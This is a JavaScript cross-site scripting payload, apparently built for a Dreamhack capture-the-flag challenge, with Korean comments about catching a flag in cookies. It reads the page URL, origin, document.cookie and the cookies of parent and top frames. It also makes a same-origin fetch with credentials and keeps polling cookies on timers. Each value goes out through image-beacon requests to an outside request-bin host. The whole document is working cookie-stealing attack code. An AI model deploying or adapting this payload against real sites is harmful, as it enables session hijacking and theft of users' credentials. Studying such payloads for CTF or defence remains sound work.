  (() => {
    const BIN = "https://lnbuyrp.request.dreamhack.games";
    const ID = "deep_" + Date.now() + "_" + Math.random().toString(16).slice(2);

    const send = (k, v) => {
      const u = `${BIN}/?id=${encodeURIComponent(ID)}&${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`;
      new Image().src = u;
    };

    const probe = (k, fn) => {
      try { send(k, fn()); }
      catch (e) { send(k + "_err", (e && e.name ? e.name : "ERR") + ":" + (e && e.message ? e.message : "")); }
    };

    send("phase", "start");

    probe("href", () => location.href);
    probe("loc_origin", () => location.origin);
    probe("win_origin", () => window.origin);
    probe("is_secure", () => self.isSecureContext);
    probe("sw_in_nav", () => ("serviceWorker" in navigator));
    probe("cookie_self_0", () => document.cookie);

    // parent / top 접근 확인
    probe("parent_eq_self", () => parent === window);
    probe("top_eq_self", () => top === window);
    probe("parent_href", () => parent.location.href);
    probe("parent_origin", () => parent.origin);
    probe("parent_cookie_0", () => parent.document.cookie);
    probe("top_cookie_0", () => top.document.cookie);

    // same-origin fetch 가능 여부
    fetch("/?src", { credentials: "include" })
      .then(r => r.text())
      .then(t => send("fetch_src_len", t.length))
      .catch(e => send("fetch_src_err", e.name + ":" + e.message));

    // 쿠키 타이밍 관찰 (FLAG가 잠깐이라도 보이는지)
    [1000, 2500, 4000, 6000, 9000].forEach(ms => {
      setTimeout(() => {
        probe("cookie_self_t" + ms, () => document.cookie);
        probe("parent_cookie_t" + ms, () => parent.document.cookie);
      }, ms);
    });

    setTimeout(() => send("phase", "end"), 10000);
  })();
